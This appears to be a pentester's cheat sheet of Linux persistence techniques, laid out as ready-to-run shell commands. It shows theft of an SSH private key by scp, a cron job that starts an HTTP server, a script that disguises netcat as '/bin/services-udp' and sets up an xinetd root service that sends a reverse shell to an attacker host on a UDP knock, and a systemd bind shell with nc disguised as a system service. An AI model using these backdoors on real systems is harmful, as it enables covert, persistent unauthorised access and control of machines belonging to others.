
# ssh key

```bash
scp student@192.37.104.3:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa student@192.37.104.3
```

# cron jobs

```bash
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron # cron job, tworzy serwer http w folderze domowym
crontab -i cron
crontab -l
```
## Xinetd UDP Portknock Backdoor
Persist across reboot

The following script, when executed, will create a new xinetd service called "services-udp.” 
The “services-udp” custom service will be configured to listen on port 65534 UDP on the target machine. 
It will also require that netcat (nc) is on the target host in the usual /bin/ directory. 
It will copy the nc executable to a file called “/bin/services-udp.” 
We're obscuring netcat as another file in this case.
```bash
$ cat xinetd_server.sh

#!/bin/bash
cp /bin/nc /bin/services-udp

echo "service services-udp" >/etc/xinetd.d/services-udp
echo "{" >> /etc/xinetd.d/services-udp
echo "		server = /bin/services-udp" >> /etc/xinetd.d/services-udp
echo "		server_args = <attacker_IP> <attacker_PORT> -e /bin/bash" >> /etc/xinetd.d/services-udp
echo "		protocol = udp" >> /etc/xinetd.d/services-udp
echo "		user = root" >> /etc/xinetd.d/services-udp
echo "		socket_type = dgram" >> /etc/xinetd.d/services-udp
echo "		wait = yes" >> /etc/xinetd.d/services-udp
echo "		flags = IPv4" >> /etc/xinetd.d/services-udp
echo "}" >> /etc/xinetd.d/services-udp
echo "services-udp	65534/udp       # services-udp" >> /etc/services
/etc/init.d/xinetd stop
/etc/init.d/xinetd start
```
```bash
$ nc -lvnp 4444 # Attacker, listener
$ hping3 -2 -c 1 <target IP> -p 65534 # Victim, send single UDP packet to port 65534 on the target host, custom service will send a reverse shell
```
# Systemd Netcat Bind Shell
```bash
$ cp /bin/nc /lib/systemd/systemd-service # copy nc file

# systemd service configuration file will create bindshell on port 56825 TCP
$ cat /lib/systemd/system/systemd.service # create service configuration file
[Unit]
Description = Systemd Service
After = network.target
[Service]
ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh 
[Install] 
WantedBy = multi-user.target

# enable and start service
$ systemctl enable systemd.service
$ systemctl start systemd.service
# confirm custom service start
$ netstat –auntp |grep 56825
```
```bash
$ nc <IP> 56825
```